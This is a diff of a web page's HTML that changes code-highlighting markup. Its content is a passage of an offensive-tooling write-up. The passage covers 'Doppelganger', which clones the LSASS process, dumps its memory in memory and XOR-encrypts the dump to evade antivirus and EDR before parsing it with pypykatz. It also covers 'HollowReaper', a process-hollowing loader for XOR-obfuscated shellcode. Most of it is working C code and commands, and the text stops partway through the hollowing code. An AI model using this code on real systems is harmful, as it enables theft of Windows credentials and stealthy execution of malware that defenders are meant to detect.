-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>NTSTATUS status <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">pNTCPX</span>(
-</span></span><span style="display:flex;"><span>    <span style="color:#91d7e3;font-weight:bold">&amp;</span>hClone,                    <span style="color:#6e738d;font-style:italic">// Output: Handle to cloned process
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>    PROCESS_ALL_ACCESS,         <span style="color:#6e738d;font-style:italic">// Desired access
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>    <span style="color:#91d7e3;font-weight:bold">&amp;</span>objAttr,                   <span style="color:#6e738d;font-style:italic">// Object attributes (can be NULL)
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>    hLsass,                     <span style="color:#6e738d;font-style:italic">// Parent process handle (real LSASS)
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>    <span style="color:#f5a97f">0</span>,                          <span style="color:#6e738d;font-style:italic">// Flags
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>    <span style="color:#91d7e3">NULL</span>, <span style="color:#91d7e3">NULL</span>, <span style="color:#91d7e3">NULL</span>,           <span style="color:#6e738d;font-style:italic">// Sections (can be NULL for default clone)
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>    FALSE                       <span style="color:#6e738d;font-style:italic">// Inherit handles
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="nf">pNTCPX</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="o">&amp;</span><span class="n">hClone</span><span class="p">,</span>                    <span class="c1">// Output: Handle to cloned process
+</span></span></span><span class="line"><span class="cl">    <span class="n">PROCESS_ALL_ACCESS</span><span class="p">,</span>         <span class="c1">// Desired access
+</span></span></span><span class="line"><span class="cl">    <span class="o">&amp;</span><span class="n">objAttr</span><span class="p">,</span>                   <span class="c1">// Object attributes (can be NULL)
+</span></span></span><span class="line"><span class="cl">    <span class="n">hLsass</span><span class="p">,</span>                     <span class="c1">// Parent process handle (real LSASS)
+</span></span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span>                          <span class="c1">// Flags
+</span></span></span><span class="line"><span class="cl">    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>           <span class="c1">// Sections (can be NULL for default clone)
+</span></span></span><span class="line"><span class="cl">    <span class="n">FALSE</span>                       <span class="c1">// Inherit handles
+</span></span></span><span class="line"><span class="cl"><span class="p">);</span>
 </span></span></code></pre></div><p>The result: a <strong>new process that is a clone of LSASS</strong>, with all of its memory copied over.</p>
 <blockquote>
 <p><strong>Note</strong>: This is a real fork, not a new instance of <code>lsass.exe</code>. It doesn’t appear in Task Manager or usual process listings unless specifically searched.</p>
@@ -591,13 +582,13 @@ This significantly reduces detection surface compared to classic memory dumping 
 <h4 id="dumping-the-cloned-process">Dumping the Cloned Process</h4>
 <p>At this point, PPL has been removed, the clone exists, and it’s fully accessible.
 Doppelganger simply calls the dump function:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL dumped <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">pMDWD</span>(
-</span></span><span style="display:flex;"><span>    hClone,                 <span style="color:#6e738d;font-style:italic">// Handle to cloned process
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>    clonedPID,              <span style="color:#6e738d;font-style:italic">// Process ID
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>    <span style="color:#91d7e3">NULL</span>,                   <span style="color:#6e738d;font-style:italic">// File handle (can be NULL when dumping to memory)
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>    MiniDumpWithFullMemory, <span style="color:#6e738d;font-style:italic">// Dump type
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>    <span style="color:#91d7e3">NULL</span>, <span style="color:#91d7e3">NULL</span>, <span style="color:#91d7e3;font-weight:bold">&amp;</span>mci        <span style="color:#6e738d;font-style:italic">// Optional parameters. mci (MiniDump_Callback_Information), specifically, is a callback that writes the dump in memory instead of on a file
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">BOOL</span> <span class="n">dumped</span> <span class="o">=</span> <span class="nf">pMDWD</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hClone</span><span class="p">,</span>                 <span class="c1">// Handle to cloned process
+</span></span></span><span class="line"><span class="cl">    <span class="n">clonedPID</span><span class="p">,</span>              <span class="c1">// Process ID
+</span></span></span><span class="line"><span class="cl">    <span class="nb">NULL</span><span class="p">,</span>                   <span class="c1">// File handle (can be NULL when dumping to memory)
+</span></span></span><span class="line"><span class="cl">    <span class="n">MiniDumpWithFullMemory</span><span class="p">,</span> <span class="c1">// Dump type
+</span></span></span><span class="line"><span class="cl">    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">mci</span>        <span class="c1">// Optional parameters. mci (MiniDump_Callback_Information), specifically, is a callback that writes the dump in memory instead of on a file
+</span></span></span><span class="line"><span class="cl"><span class="p">);</span>
 </span></span></code></pre></div><p>If successful, this produces a <strong>raw, plaintext memory dump</strong> containing credentials, Kerberos tickets, token handles, and more.</p>
 <hr>
 <h4 id="in-memory-dumping-with-custom-callback">In-Memory Dumping with Custom Callback</h4>
@@ -609,33 +600,33 @@ Doppelganger simply calls the dump function:</p>
 <li><code>IoFinishCallback</code>: Indicates completion of the dump. At this point, the full LSASS dump is available in memory.</li>
 </ul>
 <p>Here’s a simplified overview of the logic:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#c6a0f6">case</span> <span style="color:#91d7e3">IoWriteAllCallback</span>:
-</span></span><span style="display:flex;"><span>    source <span style="color:#91d7e3;font-weight:bold">=</span> CallbackInput<span style="color:#91d7e3;font-weight:bold">-&gt;</span>Io.Buffer;
-</span></span><span style="display:flex;"><span>    destination <span style="color:#91d7e3;font-weight:bold">=</span> (LPVOID)((DWORD_PTR)dumpBuffer <span style="color:#91d7e3;font-weight:bold">+</span> (DWORD_PTR)CallbackInput<span style="color:#91d7e3;font-weight:bold">-&gt;</span>Io.Offset);
-</span></span><span style="display:flex;"><span>    bufferSize <span style="color:#91d7e3;font-weight:bold">=</span> CallbackInput<span style="color:#91d7e3;font-weight:bold">-&gt;</span>Io.BufferBytes;
-</span></span><span style="display:flex;"><span>    <span style="color:#8aadf4">RtlCopyMemory</span>(destination, source, bufferSize);
-</span></span><span style="display:flex;"><span>    dumpSize <span style="color:#91d7e3;font-weight:bold">+=</span> bufferSize;
-</span></span><span style="display:flex;"><span>    CallbackOutput<span style="color:#91d7e3;font-weight:bold">-&gt;</span>Status <span style="color:#91d7e3;font-weight:bold">=</span> S_OK;
-</span></span><span style="display:flex;"><span>    <span style="color:#c6a0f6">break</span>;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">case</span> <span class="nl">IoWriteAllCallback</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">source</span> <span class="o">=</span> <span class="n">CallbackInput</span><span class="o">-&gt;</span><span class="n">Io</span><span class="p">.</span><span class="n">Buffer</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">destination</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPVOID</span><span class="p">)((</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">dumpBuffer</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD_PTR</span><span class="p">)</span><span class="n">CallbackInput</span><span class="o">-&gt;</span><span class="n">Io</span><span class="p">.</span><span class="n">Offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">bufferSize</span> <span class="o">=</span> <span class="n">CallbackInput</span><span class="o">-&gt;</span><span class="n">Io</span><span class="p">.</span><span class="n">BufferBytes</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">RtlCopyMemory</span><span class="p">(</span><span class="n">destination</span><span class="p">,</span> <span class="n">source</span><span class="p">,</span> <span class="n">bufferSize</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">dumpSize</span> <span class="o">+=</span> <span class="n">bufferSize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">CallbackOutput</span><span class="o">-&gt;</span><span class="n">Status</span> <span class="o">=</span> <span class="n">S_OK</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">break</span><span class="p">;</span>
 </span></span></code></pre></div><p>This in-memory dumping technique avoids writing raw credential data to disk and significantly reduces the risk of detection. Once the full dump is collected, it is <strong>XOR-encrypted</strong> and written to disk only in its obfuscated form—rendering it unreadable to forensic or real-time file scanners.</p>
 <hr>
 <h4 id="xor-encryption-for-stealth">XOR Encryption for Stealth</h4>
 <p>Rather than saving the dump directly to disk in plaintext (which would trigger alerts from Defender, EDRs, or AVs), Doppelganger <strong>encrypts it in memory using XOR</strong>, then writes the encrypted dump to disk.</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// Encrypt memory dump
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span><span style="color:#8aadf4">xor_buffer</span>(dumpBuffer, dumpSize, XOR_KEY, key_len);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// Create file on disk
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>   HANDLE dumpFile <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">pCFA</span>(outPath, GENERIC_WRITE, <span style="color:#f5a97f">0</span>, <span style="color:#91d7e3">NULL</span>, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, <span style="color:#91d7e3">NULL</span>);
-</span></span><span style="display:flex;"><span>   <span style="color:#c6a0f6">if</span> (dumpFile <span style="color:#91d7e3;font-weight:bold">==</span> INVALID_HANDLE_VALUE) {
-</span></span><span style="display:flex;"><span>       <span style="color:#8aadf4">log_error</span>(<span style="color:#a6da95">&#34;Failed to create output file. Error: %lu&#34;</span>, <span style="color:#8aadf4">GetLastError</span>());
-</span></span><span style="display:flex;"><span>       <span style="color:#8aadf4">HeapFree</span>(<span style="color:#8aadf4">GetProcessHeap</span>(), <span style="color:#f5a97f">0</span>, dumpBuffer);
-</span></span><span style="display:flex;"><span>       <span style="color:#c6a0f6">return</span> FALSE;
-</span></span><span style="display:flex;"><span>   }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>   <span style="color:#6e738d;font-style:italic">// Write buffer on file
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>   DWORD bytesWritten <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#f5a97f">0</span>;
-</span></span><span style="display:flex;"><span>   BOOL writeSuccess <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">WriteFile</span>(dumpFile, dumpBuffer, dumpSize, <span style="color:#91d7e3;font-weight:bold">&amp;</span>bytesWritten, <span style="color:#91d7e3">NULL</span>);
-</span></span><span style="display:flex;"><span>   <span style="color:#8aadf4">CloseHandle</span>(dumpFile);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Encrypt memory dump
+</span></span></span><span class="line"><span class="cl"><span class="nf">xor_buffer</span><span class="p">(</span><span class="n">dumpBuffer</span><span class="p">,</span> <span class="n">dumpSize</span><span class="p">,</span> <span class="n">XOR_KEY</span><span class="p">,</span> <span class="n">key_len</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Create file on disk
+</span></span></span><span class="line"><span class="cl">   <span class="n">HANDLE</span> <span class="n">dumpFile</span> <span class="o">=</span> <span class="nf">pCFA</span><span class="p">(</span><span class="n">outPath</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">CREATE_ALWAYS</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="n">dumpFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">       <span class="nf">log_error</span><span class="p">(</span><span class="s">&#34;Failed to create output file. Error: %lu&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">       <span class="nf">HeapFree</span><span class="p">(</span><span class="nf">GetProcessHeap</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">dumpBuffer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">       <span class="k">return</span> <span class="n">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">   <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="c1">// Write buffer on file
+</span></span></span><span class="line"><span class="cl">   <span class="n">DWORD</span> <span class="n">bytesWritten</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">   <span class="n">BOOL</span> <span class="n">writeSuccess</span> <span class="o">=</span> <span class="nf">WriteFile</span><span class="p">(</span><span class="n">dumpFile</span><span class="p">,</span> <span class="n">dumpBuffer</span><span class="p">,</span> <span class="n">dumpSize</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesWritten</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">   <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">dumpFile</span><span class="p">);</span>
 </span></span></code></pre></div><p>This ensures:</p>
 <ul>
 <li>The dump <strong>doesn’t match known LSASS dump signatures</strong>,</li>
@@ -645,9 +636,9 @@ Doppelganger simply calls the dump function:</p>
 <hr>
 <h4 id="decryption-and-analysis">Decryption and Analysis</h4>
 <p>To analyze the dump later, a simple Python script is provided (<code>decrypt_xor_dump.py</code>). It uses the same XOR key to decrypt the <code>.dmp</code> file back to a valid MiniDump:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>python decrypt_xor_dump.<span style="color:#f5a97f">py</span> C:\Windows\Public\doppelganger.<span style="color:#f5a97f">dmp</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">python</span> <span class="n">decrypt_xor_dump</span><span class="p">.</span><span class="py">py</span> <span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Public</span><span class="p">\</span><span class="n">doppelganger</span><span class="p">.</span><span class="py">dmp</span>
 </span></span></code></pre></div><p>After decryption, tools like <strong>Pypykatz</strong> can parse the dump normally:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>pypykatz lsa minidump doppelganger.<span style="color:#f5a97f">dmp</span>.<span style="color:#f5a97f">dec</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">pypykatz</span> <span class="n">lsa</span> <span class="n">minidump</span> <span class="n">doppelganger</span><span class="p">.</span><span class="py">dmp</span><span class="p">.</span><span class="py">dec</span>
 </span></span></code></pre></div><h2 id="bonus-hollowreaper--advanced-process-hollowing">Bonus: HollowReaper – Advanced Process Hollowing</h2>
 <p><strong>HollowReaper</strong> is an advanced shellcode loader built to run <strong>Doppelganger in-memory</strong>, using a stealthy and minimal process hollowing technique.</p>
 <p>Unlike traditional reflective loaders that tamper with the PEB or manually map PE sections, HollowReaper uses <strong>clean API calls, direct section mapping, and RIP redirection</strong>—a technique far less suspicious to modern EDRs.</p>
@@ -672,113 +663,113 @@ Doppelganger simply calls the dump function:</p>
 </ol>
 <hr>
 <h3 id="1-create-suspended-process">1. Create Suspended Process</h3>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// Create the process in a suspended state
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>
-</span></span><span style="display:flex;"><span>STARTUPINFOW si;
-</span></span><span style="display:flex;"><span>PROCESS_INFORMATION pi;
-</span></span><span style="display:flex;"><span><span style="color:#8aadf4">ZeroMemory</span>(<span style="color:#91d7e3;font-weight:bold">&amp;</span>si, <span style="color:#c6a0f6">sizeof</span>(si));
-</span></span><span style="display:flex;"><span>si.cb <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#c6a0f6">sizeof</span>(si);
-</span></span><span style="display:flex;"><span><span style="color:#8aadf4">ZeroMemory</span>(<span style="color:#91d7e3;font-weight:bold">&amp;</span>pi, <span style="color:#c6a0f6">sizeof</span>(pi));
-</span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// CreateProcessW
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span><span style="color:#c6a0f6">if</span> (<span style="color:#91d7e3;font-weight:bold">!</span><span style="color:#8aadf4">pCPW</span>(exePathW, <span style="color:#91d7e3">NULL</span>, <span style="color:#91d7e3">NULL</span>, <span style="color:#91d7e3">NULL</span>, FALSE, CREATE_SUSPENDED, <span style="color:#91d7e3">NULL</span>, <span style="color:#91d7e3">NULL</span>, <span style="color:#91d7e3;font-weight:bold">&amp;</span>si, <span style="color:#91d7e3;font-weight:bold">&amp;</span>pi)) {
-</span></span><span style="display:flex;"><span>    <span style="color:#8aadf4">free</span>(exePathW);
-</span></span><span style="display:flex;"><span>    <span style="color:#c6a0f6">return</span> <span style="color:#f5a97f">1</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span><span style="display:flex;"><span><span style="color:#8aadf4">free</span>(exePathW);
-</span></span><span style="display:flex;"><span><span style="color:#8aadf4">printf</span>(<span style="color:#a6da95">&#34;[+] Process created in suspended state, PID: %lu</span><span style="color:#8aadf4">\n</span><span style="color:#a6da95">&#34;</span>, pi.dwProcessId);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Create the process in a suspended state
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">STARTUPINFOW</span> <span class="n">si</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">ZeroMemory</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pi</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pi</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// CreateProcessW
+</span></span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">pCPW</span><span class="p">(</span><span class="n">exePathW</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">FALSE</span><span class="p">,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">free</span><span class="p">(</span><span class="n">exePathW</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nf">free</span><span class="p">(</span><span class="n">exePathW</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Process created in suspended state, PID: %lu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">pi</span><span class="p">.</span><span class="n">dwProcessId</span><span class="p">);</span>
 </span></span></code></pre></div><p>The process (e.g., <code>explorer.exe</code>, <code>svchost.exe</code>) is launched <strong>suspended</strong>, so we can safely modify it before it runs.</p>
 <hr>
 <h3 id="2-xor-deobfuscate-shellcode">2. XOR-Deobfuscate Shellcode</h3>
 <p>The payload (<code>Doppelganger.exe</code>) is compiled to shellcode with <a href="https://github.com/TheWover/donut">Donut</a>, then XOR-encrypted:</p>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ed8796">unsigned</span> <span style="color:#ed8796">char</span> shellcode_enc[] <span style="color:#91d7e3;font-weight:bold">=</span> { <span style="color:#f5a97f">0xD8</span>, <span style="color:#f5a97f">0xF1</span>, <span style="color:#f5a97f">0x45</span>, <span style="color:#f5a97f">0x33</span>, ... };
-</span></span><span style="display:flex;"><span><span style="color:#ed8796">size_t</span> shellcode_len <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#c6a0f6">sizeof</span>(shellcode_enc);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#8aadf4">xor_decrypt_buffer</span>(shellcode_enc, shellcode_len, XOR_KEY, key_len);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode_enc</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0xD8</span><span class="p">,</span> <span class="mh">0xF1</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="p">...</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="kt">size_t</span> <span class="n">shellcode_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode_enc</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nf">xor_decrypt_buffer</span><span class="p">(</span><span class="n">shellcode_enc</span><span class="p">,</span> <span class="n">shellcode_len</span><span class="p">,</span> <span class="n">XOR_KEY</span><span class="p">,</span> <span class="n">key_len</span><span class="p">);</span>
 </span></span></code></pre></div><hr>
 <h3 id="3-create-executable-section">3. Create Executable Section</h3>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE hSection <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#91d7e3">NULL</span>;
-</span></span><span style="display:flex;"><span>LARGE_INTEGER sectionSize <span style="color:#91d7e3;font-weight:bold">=</span> { <span style="color:#f5a97f">0</span> };
-</span></span><span style="display:flex;"><span>sectionSize.QuadPart <span style="color:#91d7e3;font-weight:bold">=</span> shellcode_len;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>NTSTATUS status <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#8aadf4">pNCS</span>(<span style="color:#91d7e3;font-weight:bold">&amp;</span>hSection, SECTION_ALL_ACCESS, <span style="color:#91d7e3">NULL</span>, <span style="color:#91d7e3;font-weight:bold">&amp;</span>sectionSize,
-</span></span><span style="display:flex;"><span>    PAGE_EXECUTE_READWRITE, SEC_COMMIT, <span style="color:#91d7e3">NULL</span>);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">HANDLE</span> <span class="n">hSection</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LARGE_INTEGER</span> <span class="n">sectionSize</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="n">sectionSize</span><span class="p">.</span><span class="n">QuadPart</span> <span class="o">=</span> <span class="n">shellcode_len</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="nf">pNCS</span><span class="p">(</span><span class="o">&amp;</span><span class="n">hSection</span><span class="p">,</span> <span class="n">SECTION_ALL_ACCESS</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sectionSize</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">,</span> <span class="n">SEC_COMMIT</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
 </span></span></code></pre></div><p>This creates a <strong>memory section object</strong> with RWX permissions.</p>
 <hr>
 <h3 id="4-map-section-in-both-processes">4. Map Section in Both Processes</h3>
-<div class="highlight"><pre tabindex="0" style="color:#cad3f5;background-color:#24273a;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// Local mapping (for writing shellcode)
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>PVOID localBase <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#91d7e3">NULL</span>;
-</span></span><span style="display:flex;"><span>SIZE_T viewSize <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#f5a97f">0</span>;
-</span></span><span style="display:flex;"><span><span style="color:#8aadf4">pNMVOS</span>(hSection, <span style="color:#8aadf4">pGCP</span>(), <span style="color:#91d7e3;font-weight:bold">&amp;</span>localBase, <span style="color:#f5a97f">0</span>, <span style="color:#f5a97f">0</span>, <span style="color:#91d7e3">NULL</span>, <span style="color:#91d7e3;font-weight:bold">&amp;</span>viewSize, <span style="color:#f5a97f">2</span>, <span style="color:#f5a97f">0</span>, PAGE_READWRITE); <span style="color:#6e738d;font-style:italic">// NtMapViewOfSection
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// Writing Shellcode
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span><span style="color:#8aadf4">memcpy</span>(localBase, shellcode_enc, shellcode_len);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic">// Remote mapping (for execution)
-</span></span></span><span style="display:flex;"><span><span style="color:#6e738d;font-style:italic"></span>PVOID remoteBase <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#91d7e3">NULL</span>;
-</span></span><span style="display:flex;"><span>viewSize <span style="color:#91d7e3;font-weight:bold">=</span> <span style="color:#f5a97f">0</span>;
-</span></span><span style="display:flex;"><span><span style="color:#8aadf4">pNMVOS</span>(hSection, pi.hProcess, <span style="color:#91d7e3;font-weight:bold">&amp;</span>remoteBase, <span style="color:#f5a97f">0</span>, <span style="color:#f5a97f">0</span>, <span style="color:#91d7e3">NULL</span>, <span style="color:#91d7e3;font-weight:bold">&amp;</span>viewSize, <span style="color:#f5a97f">2</span>, <span style="color:#f5a97f">0</span>, PAGE_EXECUTE_READ); <span style="color:#6e738d;font-style:italic">// NtMapViewOfSection
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="c1">// Local mapping (for writing shellcode)
+</span></span></span><span class="line"><span class="cl"><span class="n">PVOID</span> <span class="n">localBase</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
